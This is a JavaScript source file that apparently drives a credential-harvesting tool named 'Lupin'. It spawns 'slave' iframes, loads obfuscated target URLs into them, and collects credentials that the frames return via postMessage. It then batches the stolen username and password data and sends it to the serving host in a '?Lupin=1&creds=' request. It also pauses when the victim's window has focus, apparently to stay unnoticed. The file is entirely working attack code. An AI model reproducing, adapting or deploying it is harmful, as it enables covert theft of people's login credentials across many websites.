var creds = "";
var bundle = 1;
var maxSlaves = 10;
var checkLimit = 30;
var waitTime = 1000;
var check = 0;
var finishedSlaves = 0;	
var pause;
var numSlaves;
var targetIndexArray;
var chunkLenArray;



           
function deobfs(string){
	var nums = string.split(".")
        var deobfs = "";
	var k;
           
        for (i=0; i<nums.length; i+=1){
        	k = parseInt(nums[i])-255;
                deobfs+=String.fromCharCode(k);
        }
	return deobfs;
}


function moveSrc(slaveFrameNum){


	var slaveFrameName = "slaveFrame"+slaveFrameNum.toString();
        var slaveFrame= document.getElementsByName(slaveFrameName)[0]; 
	var src = targets[targetIndexArray[slaveFrameNum]];
	targetIndexArray[slaveFrameNum] +=1;	
        slaveFrame.setAttribute('src', deobfs(src));
	return 1;
}


function createSlaveFrame(slaveFrameNum) { 

	var slaveFrame = document.createElement("IFRAME"); 

        slaveFrame.setAttribute("height", "100");
        slaveFrame.setAttribute("width", "100");
        slaveFrame.setAttribute("id", "slaveFrame"+slaveFrameNum.toString());
        slaveFrame.setAttribute("name", "slaveFrame"+slaveFrameNum.toString());

	if (slaveFrameNum == -1){ 
        	slaveFrame.setAttribute("src","http://"+document.location.hostname+"?Lupin=NOTHING");         
        }
      	document.body.appendChild(slaveFrame); 
	

} 


function advanceSlaves(){
	if(pause == true ){
		return;
	}

	
	check=0;
	for(var i=0; i<numSlaves;i++){
		if(targetIndexArray[i] < chunkLenArray[i]){
			
			if (check >=0 && check < checkLimit){
				check+=1;
				moveSrc(i);
			}else{
				check = -1;
				continue;
			}
		}	
			
	}
	setTimeout("advanceSlaves()",waitTime);

}

       
           
function onMessage (event){
	var m = event.data;
	if(m.indexOf("focus") != -1){
		pause = true;
		return;
	}else if(m.indexOf("blur") != -1){
		pause = false;
		advanceSlaves();
		return;
	}

        var cash = m.indexOf("$$$");
        var slaveFrameName = m.substring(0,cash);
        var slaveFrameNum = parseInt(slaveFrameName.substring(10));
        m = m.substring(cash+3);
	var arr = m.split(",");
	var cut;
	var credCount;
	var moved;
	
        if (m != ""){
	        creds+="|"+arr[0]+"|"+arr[1]+"|"+arr[2]+"|||||";

        }
      
	if(check >= 0 && check < checkLimit){
		if(targetIndexArray[slaveFrameNum] < chunkLenArray[slaveFrameNum]){
			if (pause == false){
				moveSrc(slaveFrameNum);
				check+=1;
			}
		}
	}else{
		check = -1;
	}

        if(targetIndexArray[slaveFrameNum] == chunkLenArray[slaveFrameNum]){
	        finishedSlaves+=1;
        }
  	
        cut = creds.lastIndexOf("|||||");
        if(finishedSlaves == numSlaves){
	        if(cut > -1){     

			src = "http://"+document.location.hostname+"?Lupin=1&creds=";
                	sendFrame = document.getElementsByName("slaveFrame-1")[0];
                	sendFrame.setAttribute('src',src+creds.substring(0,cut));               
		}
		src = "http://"+document.location.hostname+"?Lupin=KILL";
		document.location.replace(src); 
		//sendFrame = document.getElementsByName("slaveFrame-1")[0];
                //sendFrame.setAttribute('src',src);         
		return;  
        }else{   
		credCount = creds.split("|||||").length - 1;

                if(credCount == bundle) {   
   	             src = "http://"+document.location.hostname+"?Lupin=1&creds=";
                     sendFrame = document.getElementsByName("slaveFrame-1")[0];
                     sendFrame.setAttribute('src',src+creds.substring(0,cut));               
                     creds = "";
               }
        }  

}   	




function init(){

	var rem;
	if(targets.length > maxSlaves){
		numSlaves = maxSlaves;
	}else{
		numSlaves = targets.length;
	}
 
	targetIndexArray = new Array(numSlaves);
	chunkLenArray = new Array(numSlaves);

	var chunkLen = Math.floor(targets.length / numSlaves);

      	tmp = 0;
	rem = targets.length - numSlaves*chunkLen;
       	for(var i=0; i<numSlaves;i++){
       		targetIndexArray[i] = tmp;
    		tmp += chunkLen;
		if(i<rem){
			tmp+=1;
    		}
		chunkLenArray[i] = tmp;
       	}
	
	for(var i=-1;i<numSlaves;i+=1){
                createSlaveFrame(i);
      	}

	window.addEventListener ("message", onMessage, false);

}




